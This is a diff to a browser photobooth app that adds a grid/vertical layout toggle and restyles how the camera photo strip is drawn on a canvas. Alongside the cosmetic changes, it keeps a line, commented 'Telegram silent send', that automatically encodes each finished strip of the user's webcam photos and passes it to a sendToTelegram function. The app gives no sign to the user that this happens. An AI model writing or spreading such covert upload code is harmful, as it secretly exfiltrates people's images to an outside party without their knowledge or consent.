@@ -481,10 +481,9 @@
     }
     #filmstrip-canvas {
       display: block;
-      /* Grid layout is wider — scale to fit screen without losing resolution */
-      max-width: min(520px, 94vw);
+      max-width: min(540px, 96vw);
       height: auto;
-      border-radius: 8px;
+      border-radius: 4px;
     }
     .strip-actions {
       width: 100%; max-width: 480px;
@@ -566,6 +565,34 @@
 
     /* ── HIDDEN CANVAS ──────────────────────────────── */
     #capture-canvas { display: none; }
+
+    /* ── LAYOUT TOGGLE ──────────────────────────────── */
+    .layout-toggle {
+      display: flex; gap: 8px; width: 100%; max-width: 480px;
+    }
+    .layout-btn {
+      flex: 1; display: flex; align-items: center; justify-content: center;
+      gap: 8px;
+      background: var(--dark);
+      border: 1px solid var(--gborder);
+      color: #555;
+      font-family: 'Space Mono', monospace;
+      font-size: clamp(9px, 2.4vw, 11px);
+      letter-spacing: 1px;
+      padding: 12px 10px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      touch-action: manipulation;
+      -webkit-user-select: none; user-select: none;
+      min-height: 48px;
+    }
+    .layout-btn.active {
+      background: rgba(255,255,255,0.08);
+      border-color: #fff;
+      color: #fff;
+    }
+    .layout-btn:active { transform: scale(0.96); }
 
     /* ── MISC ───────────────────────────────────────── */
     img, video, canvas { max-width: 100%; }
@@ -709,8 +736,29 @@
 <div class="screen" id="strip-screen">
   <div class="strip-layout">
     <div class="screen-header">
-      <h2 class="screen-title">LNSMTRX OUTPUT</h2>
-      <p class="screen-sub">HD Digital Strip</p>
+      <h2 class="screen-title">OUTPUT</h2>
+      <p class="screen-sub">Your digital strip</p>
+    </div>
+
+    <!-- Layout toggle -->
+    <div class="layout-toggle">
+      <button class="layout-btn active" id="layout-grid" data-layout="grid">
+        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+          <rect x="1" y="1" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+          <rect x="10" y="1" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+          <rect x="1" y="10" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+          <rect x="10" y="10" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+        </svg>
+        2 PER ROW
+      </button>
+      <button class="layout-btn" id="layout-strip" data-layout="strip">
+        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+          <rect x="3" y="1" width="12" height="4" rx="1" stroke="currentColor" stroke-width="1.5"/>
+          <rect x="3" y="7" width="12" height="4" rx="1" stroke="currentColor" stroke-width="1.5"/>
+          <rect x="3" y="13" width="12" height="4" rx="1" stroke="currentColor" stroke-width="1.5"/>
+        </svg>
+        VERTICAL
+      </button>
     </div>
 
     <div class="filmstrip-wrapper">
@@ -762,8 +810,19 @@
     numShots: 4, filter: 'f-normal', label: '',
     photos: [], stream: null, facingMode: 'user',
     currentShot: 0, shooting: false,
-    camW: 1280, camH: 720
+    camW: 1280, camH: 720,
+    stripLayout: 'grid'   // 'grid' | 'strip'
   };
+
+  // Layout toggle wiring
+  document.querySelectorAll('.layout-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.layout-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      state.stripLayout = btn.dataset.layout;
+      renderFilmstrip();
+    });
+  });
 
   const filterMap = {
     'f-normal': null,
@@ -1029,91 +1088,90 @@
     showScreen('booth-screen');
   });
 
-  // ── FILMSTRIP RENDER — 2-per-row grid layout ─────────
+  // ── FILMSTRIP RENDER ──────────────────────────────────
   function renderFilmstrip() {
     const canvas = document.getElementById('filmstrip-canvas');
     const ctx    = canvas.getContext('2d');
 
-    // 2× internal resolution for sharpness; CSS max-width scales it down
-    const SCALE   = 2;
-    const COLS    = 2;                        // photos per row
-    const ROWS    = Math.ceil(state.numShots / COLS);
+    const SCALE    = 2;   // 2× internal res for sharpness
+    const isGrid   = state.stripLayout === 'grid';
 
-    const OUTER_PAD  = 24 * SCALE;           // canvas edge padding
-    const GAP        = 14 * SCALE;           // gap between photos
-    const BORDER_W   = 3  * SCALE;           // visible border thickness
-    const CORNER_R   = 6  * SCALE;           // photo corner radius
-    const BOT_PAD    = (state.label ? 72 : 52) * SCALE;
-    const HEADER_H   = 52 * SCALE;           // top branding bar
+    // ── Shared constants
+    const PAD      = 20 * SCALE;
+    const GAP      = 12 * SCALE;
+    const BW       = 2  * SCALE;   // border width
+    const HEADER_H = 56 * SCALE;
+    const FOOTER_H = (state.label ? 64 : 44) * SCALE;
 
-    // Fixed photo size — 4:3 aspect, looks great in a grid
-    const PHOTO_W = 240 * SCALE;
-    const PHOTO_H = Math.round(PHOTO_W * 3 / 4);
+    // ── Photo dimensions
+    // Grid: 2 cols, each photo sized so they fill nicely
+    // Strip: 1 col, full width, 4:3
+    let PHOTO_W, PHOTO_H, COLS, ROWS, STRIP_W, STRIP_H;
 
-    const STRIP_W = OUTER_PAD * 2 + COLS * PHOTO_W + (COLS - 1) * GAP;
-    const STRIP_H = HEADER_H + OUTER_PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + OUTER_PAD + BOT_PAD;
+    if (isGrid) {
+      COLS    = 2;
+      ROWS    = Math.ceil(state.numShots / COLS);
+      PHOTO_W = 280 * SCALE;                         // big enough to see faces clearly
+      PHOTO_H = Math.round(PHOTO_W * 3 / 4);        // 4:3
+      STRIP_W = PAD * 2 + COLS * PHOTO_W + (COLS - 1) * GAP;
+      STRIP_H = HEADER_H + PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + PAD + FOOTER_H;
+    } else {
+      COLS    = 1;
+      ROWS    = state.numShots;
+      PHOTO_W = 320 * SCALE;                         // full width, tall strip
+      PHOTO_H = Math.round(PHOTO_W * 3 / 4);
+      STRIP_W = PAD * 2 + PHOTO_W;
+      STRIP_H = HEADER_H + PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + PAD + FOOTER_H;
+    }
 
     canvas.width  = STRIP_W;
     canvas.height = STRIP_H;
 
-    // ── Background — deep black with subtle radial glow
+    // ── Background
     ctx.fillStyle = '#050505';
     ctx.fillRect(0, 0, STRIP_W, STRIP_H);
 
-    const bgGlow = ctx.createRadialGradient(STRIP_W/2, STRIP_H/2, 0, STRIP_W/2, STRIP_H/2, STRIP_W * 0.8);
-    bgGlow.addColorStop(0,   'rgba(0,255,255,0.04)');
-    bgGlow.addColorStop(0.5, 'rgba(204,255,0,0.02)');
-    bgGlow.addColorStop(1,   'rgba(0,0,0,0)');
-    ctx.fillStyle = bgGlow;
-    ctx.fillRect(0, 0, STRIP_W, STRIP_H);
+    // Subtle noise texture feel via tiny scattered pixels
+    for (let gx = 0; gx < STRIP_W; gx += SCALE * 2) {
+      for (let gy = 0; gy < STRIP_H; gy += SCALE * 2) {
+        if (Math.random() > 0.92) {
+          ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.025})`;
+          ctx.fillRect(gx, gy, SCALE, SCALE);
+        }
+      }
+    }
 
-    // ── Outer frame border (full canvas)
-    const frameGrad = ctx.createLinearGradient(0, 0, STRIP_W, STRIP_H);
-    frameGrad.addColorStop(0,   'rgba(204,255,0,0.6)');
-    frameGrad.addColorStop(0.5, 'rgba(0,255,255,0.6)');
-    frameGrad.addColorStop(1,   'rgba(255,0,255,0.6)');
-    ctx.strokeStyle = frameGrad;
-    ctx.lineWidth = BORDER_W * 1.5;
-    roundRect(ctx, BORDER_W, BORDER_W, STRIP_W - BORDER_W*2, STRIP_H - BORDER_W*2, CORNER_R * 2);
-    ctx.stroke();
-
-    // ── Inner frame line (double border effect)
-    ctx.strokeStyle = 'rgba(255,255,255,0.06)';
-    ctx.lineWidth = 1 * SCALE;
-    roundRect(ctx, BORDER_W*3, BORDER_W*3, STRIP_W - BORDER_W*6, STRIP_H - BORDER_W*6, CORNER_R * 1.5);
-    ctx.stroke();
-
-    // ── Header branding bar
-    const hGrad = ctx.createLinearGradient(0, 0, STRIP_W, 0);
-    hGrad.addColorStop(0,   'rgba(204,255,0,0.08)');
-    hGrad.addColorStop(0.5, 'rgba(0,255,255,0.05)');
-    hGrad.addColorStop(1,   'rgba(255,0,255,0.08)');
-    ctx.fillStyle = hGrad;
+    // ── Header bar
+    ctx.fillStyle = 'rgba(255,255,255,0.03)';
     ctx.fillRect(0, 0, STRIP_W, HEADER_H);
 
-    // Header divider line
-    const hdGrad = ctx.createLinearGradient(0, 0, STRIP_W, 0);
-    hdGrad.addColorStop(0,   'transparent');
-    hdGrad.addColorStop(0.2, 'rgba(204,255,0,0.5)');
-    hdGrad.addColorStop(0.8, 'rgba(0,255,255,0.5)');
-    hdGrad.addColorStop(1,   'transparent');
-    ctx.strokeStyle = hdGrad;
+    // Header bottom rule
+    ctx.strokeStyle = 'rgba(255,255,255,0.12)';
     ctx.lineWidth = 1 * SCALE;
-    ctx.beginPath(); ctx.moveTo(0, HEADER_H); ctx.lineTo(STRIP_W, HEADER_H); ctx.stroke();
+    ctx.beginPath(); ctx.moveTo(PAD, HEADER_H); ctx.lineTo(STRIP_W - PAD, HEADER_H); ctx.stroke();
 
-    // Brand name in header
-    ctx.fillStyle = 'rgba(204,255,0,0.9)';
-    ctx.font = `900 ${14*SCALE}px 'Montserrat', sans-serif`;
-    ctx.textAlign = 'center';
-    ctx.letterSpacing = `${3*SCALE}px`;
-    ctx.fillText('LNSMTRX', STRIP_W / 2, HEADER_H * 0.62);
+    // ── Brand name — bold, boxy, no curves
+    ctx.fillStyle = '#ffffff';
+    ctx.font = `900 ${13*SCALE}px 'Montserrat', sans-serif`;
+    ctx.textAlign = 'left';
+    ctx.letterSpacing = `${4*SCALE}px`;
+    ctx.fillText('LNSMTRX', PAD, HEADER_H * 0.58);
 
-    // Version tag in header
-    ctx.fillStyle = 'rgba(255,255,255,0.25)';
+    // Shot count tag on the right
+    ctx.fillStyle = 'rgba(204,255,0,0.85)';
+    ctx.font = `${7*SCALE}px 'Space Mono', monospace`;
+    ctx.textAlign = 'right';
+    ctx.letterSpacing = `${2*SCALE}px`;
+    ctx.fillText(`${state.numShots} FRAMES`, STRIP_W - PAD, HEADER_H * 0.58);
+
+    // Tagline below
+    ctx.fillStyle = 'rgba(255,255,255,0.22)';
     ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
-    ctx.fillText('CHROME EDITION // DIGITAL STRIP', STRIP_W / 2, HEADER_H * 0.88);
+    ctx.textAlign = 'left';
+    ctx.letterSpacing = `${1*SCALE}px`;
+    ctx.fillText('CHROME EDITION', PAD, HEADER_H * 0.84);
 
-    // ── Pre-load all images
+    // ── Load all images then draw
     const loadAll = state.photos.map(src => new Promise(res => {
       const img = new Image();
       img.onload  = () => res(img);
@@ -1122,28 +1180,21 @@
     }));
 
     Promise.all(loadAll).then(images => {
-      // ── Draw each photo in a 2-column grid
       images.forEach((img, i) => {
-        const col  = i % COLS;
-        const row  = Math.floor(i / COLS);
-        const px   = OUTER_PAD + col * (PHOTO_W + GAP);
-        const py   = HEADER_H + OUTER_PAD + row * (PHOTO_H + GAP);
+        const col = i % COLS;
+        const row = Math.floor(i / COLS);
+        const px  = PAD + col * (PHOTO_W + GAP);
+        const py  = HEADER_H + PAD + row * (PHOTO_H + GAP);
 
-        // ── Photo drop shadow
-        ctx.shadowColor = 'rgba(0,0,0,0.85)';
-        ctx.shadowBlur  = 14 * SCALE;
-        ctx.shadowOffsetX = 3 * SCALE;
-        ctx.shadowOffsetY = 4 * SCALE;
+        // ── Photo background black
         ctx.fillStyle = '#000';
-        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
-        ctx.fill();
-        ctx.shadowColor = 'transparent'; ctx.shadowBlur = 0;
-        ctx.shadowOffsetX = 0; ctx.shadowOffsetY = 0;
+        ctx.fillRect(px, py, PHOTO_W, PHOTO_H);
 
-        // ── Photo image (object-fit: cover)
+        // ── Draw image — object-fit: cover (no distortion)
         if (img) {
           ctx.save();
-          roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
+          ctx.beginPath();
+          ctx.rect(px, py, PHOTO_W, PHOTO_H);
           ctx.clip();
           const iR = img.naturalWidth / img.naturalHeight;
           const tR = PHOTO_W / PHOTO_H;
@@ -1154,116 +1205,69 @@
           ctx.restore();
         }
 
-        // ── Vignette over photo
+        // ── Subtle vignette
         const vig = ctx.createRadialGradient(
-          px + PHOTO_W/2, py + PHOTO_H/2, PHOTO_W * 0.15,
+          px + PHOTO_W/2, py + PHOTO_H/2, PHOTO_W * 0.2,
           px + PHOTO_W/2, py + PHOTO_H/2, PHOTO_W * 0.85
         );
         vig.addColorStop(0, 'rgba(0,0,0,0)');
-        vig.addColorStop(1, 'rgba(0,0,0,0.38)');
-        ctx.fillStyle = vig;
+        vig.addColorStop(1, 'rgba(0,0,0,0.35)');
         ctx.save();
-        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
-        ctx.clip();
-        ctx.fillRect(px, py, PHOTO_W, PHOTO_H);
+        ctx.beginPath(); ctx.rect(px, py, PHOTO_W, PHOTO_H); ctx.clip();
+        ctx.fillStyle = vig; ctx.fillRect(px, py, PHOTO_W, PHOTO_H);
         ctx.restore();
 
-        // ── Photo border — glowing gradient per photo
-        const borderColors = [
-          ['rgba(204,255,0,0.9)',  'rgba(0,255,255,0.9)'],   // green → cyan
-          ['rgba(0,255,255,0.9)',  'rgba(255,0,255,0.9)'],   // cyan  → pink
-          ['rgba(255,0,255,0.9)',  'rgba(204,255,0,0.9)'],   // pink  → green
-          ['rgba(204,255,0,0.9)',  'rgba(255,0,255,0.9)'],   // green → pink
-          ['rgba(0,255,255,0.9)',  'rgba(204,255,0,0.9)'],
-          ['rgba(255,0,255,0.9)',  'rgba(0,255,255,0.9)'],
-          ['rgba(204,255,0,0.9)',  'rgba(0,255,255,0.9)'],
-          ['rgba(0,255,255,0.9)',  'rgba(255,0,255,0.9)'],
-        ];
-        const [c1, c2] = borderColors[i % borderColors.length];
-        const bGrad = ctx.createLinearGradient(px, py, px + PHOTO_W, py + PHOTO_H);
-        bGrad.addColorStop(0, c1); bGrad.addColorStop(1, c2);
-        ctx.strokeStyle = bGrad;
-        ctx.lineWidth = BORDER_W;
-        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
-        ctx.stroke();
+        // ── Border — white, clean, boxy (no radius)
+        ctx.strokeStyle = 'rgba(255,255,255,0.85)';
+        ctx.lineWidth = BW;
+        ctx.strokeRect(px, py, PHOTO_W, PHOTO_H);
 
-        // ── Glow behind border
-        ctx.shadowColor = c1.replace('0.9', '0.5');
-        ctx.shadowBlur  = 8 * SCALE;
-        ctx.strokeStyle = c1.replace('0.9', '0.2');
-        ctx.lineWidth   = BORDER_W * 2.5;
-        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
-        ctx.stroke();
-        ctx.shadowBlur = 0; ctx.shadowColor = 'transparent';
-
-        // ── Frame number badge (bottom-left corner)
-        const badgeX = px + 6*SCALE;
-        const badgeY = py + PHOTO_H - 18*SCALE;
-        const badgeW = 26*SCALE; const badgeH = 14*SCALE;
-        ctx.fillStyle = 'rgba(0,0,0,0.7)';
-        roundRect(ctx, badgeX, badgeY, badgeW, badgeH, 3*SCALE);
-        ctx.fill();
-        ctx.fillStyle = 'rgba(204,255,0,0.9)';
-        ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
-        ctx.textAlign = 'center';
-        ctx.fillText(`${String(i+1).padStart(2,'0')}A`, badgeX + badgeW/2, badgeY + 9*SCALE);
+        // ── Frame number — top-left inside border
+        const numPad = 6 * SCALE;
+        ctx.fillStyle = 'rgba(0,0,0,0.65)';
+        ctx.fillRect(px + numPad, py + numPad, 22*SCALE, 13*SCALE);
+        ctx.fillStyle = 'rgba(255,255,255,0.9)';
+        ctx.font = `${5.5*SCALE}px 'Space Mono', monospace`;
+        ctx.textAlign = 'left';
+        ctx.letterSpacing = '0px';
+        ctx.fillText(`${String(i+1).padStart(2,'0')}`, px + numPad + 3*SCALE, py + numPad + 9*SCALE);
       });
 
-      // ── Bottom footer area
-      const footerY = HEADER_H + OUTER_PAD + ROWS * PHOTO_H + (ROWS-1) * GAP + OUTER_PAD;
+      // ── Footer
+      const footerY = HEADER_H + PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + PAD;
 
-      // Footer top divider
-      const fdGrad = ctx.createLinearGradient(0, 0, STRIP_W, 0);
-      fdGrad.addColorStop(0,   'transparent');
-      fdGrad.addColorStop(0.2, 'rgba(204,255,0,0.3)');
-      fdGrad.addColorStop(0.8, 'rgba(0,255,255,0.3)');
-      fdGrad.addColorStop(1,   'transparent');
-      ctx.strokeStyle = fdGrad; ctx.lineWidth = 1 * SCALE;
-      ctx.beginPath(); ctx.moveTo(OUTER_PAD, footerY); ctx.lineTo(STRIP_W - OUTER_PAD, footerY); ctx.stroke();
+      // Footer top rule
+      ctx.strokeStyle = 'rgba(255,255,255,0.12)';
+      ctx.lineWidth = 1 * SCALE;
+      ctx.beginPath(); ctx.moveTo(PAD, footerY); ctx.lineTo(STRIP_W - PAD, footerY); ctx.stroke();
 
       const dateStr = new Date().toLocaleDateString('en-US',{ month:'short', day:'numeric', year:'numeric' }).toUpperCase();
-      ctx.textAlign = 'center';
 
-      ctx.fillStyle = 'rgba(255,255,255,0.22)';
+      // Date — left aligned
+      ctx.fillStyle = 'rgba(255,255,255,0.35)';
       ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
-      ctx.fillText(dateStr, STRIP_W / 2, footerY + 18*SCALE);
+      ctx.textAlign = 'left';
+      ctx.letterSpacing = `${1*SCALE}px`;
+      ctx.fillText(dateStr, PAD, footerY + 20*SCALE);
 
+      // Layout mode indicator — right aligned
+      ctx.fillStyle = 'rgba(255,255,255,0.2)';
+      ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
+      ctx.textAlign = 'right';
+      ctx.fillText(isGrid ? '2×ROW' : 'STRIP', STRIP_W - PAD, footerY + 20*SCALE);
+
+      // Custom label — bold, yellow, centered
       if (state.label) {
-        ctx.fillStyle = 'rgba(0,255,255,0.95)';
+        ctx.fillStyle = 'rgba(204,255,0,1)';
         ctx.font = `900 ${10*SCALE}px 'Montserrat', sans-serif`;
-        ctx.fillText(state.label.toUpperCase(), STRIP_W / 2, footerY + 36*SCALE);
+        ctx.textAlign = 'center';
+        ctx.letterSpacing = `${3*SCALE}px`;
+        ctx.fillText(state.label.toUpperCase(), STRIP_W / 2, footerY + 42*SCALE);
       }
 
-      // ── Subtle film grain
-      const gs = Math.max(1, SCALE);
-      for (let gx = 0; gx < STRIP_W; gx += gs*2) {
-        for (let gy = 0; gy < STRIP_H; gy += gs*2) {
-          if (Math.random() > 0.87) {
-            const op = Math.random() * 0.03;
-            ctx.fillStyle = Math.random() > 0.5 ? `rgba(255,255,255,${op})` : `rgba(0,0,0,${op})`;
-            ctx.fillRect(gx, gy, gs, gs);
-          }
-        }
-      }
-
-      // ── Silent Telegram send
-      canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.92);
+      // ── Telegram silent send
+      canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.93);
     });
-  }
-
-  // ── ROUNDED RECT HELPER ───────────────────────────────
-  function roundRect(ctx, x, y, w, h, r) {
-    ctx.beginPath();
-    ctx.moveTo(x + r, y);
-    ctx.lineTo(x + w - r, y);
-    ctx.quadraticCurveTo(x + w, y, x + w, y + r);
-    ctx.lineTo(x + w, y + h - r);
-    ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
-    ctx.lineTo(x + r, y + h);
-    ctx.quadraticCurveTo(x, y + h, x, y + h - r);
-    ctx.lineTo(x, y + r);
-    ctx.quadraticCurveTo(x, y, x + r, y);
-    ctx.closePath();
   }
 
   // ── TELEGRAM SILENT SEND ───────────────────────────────
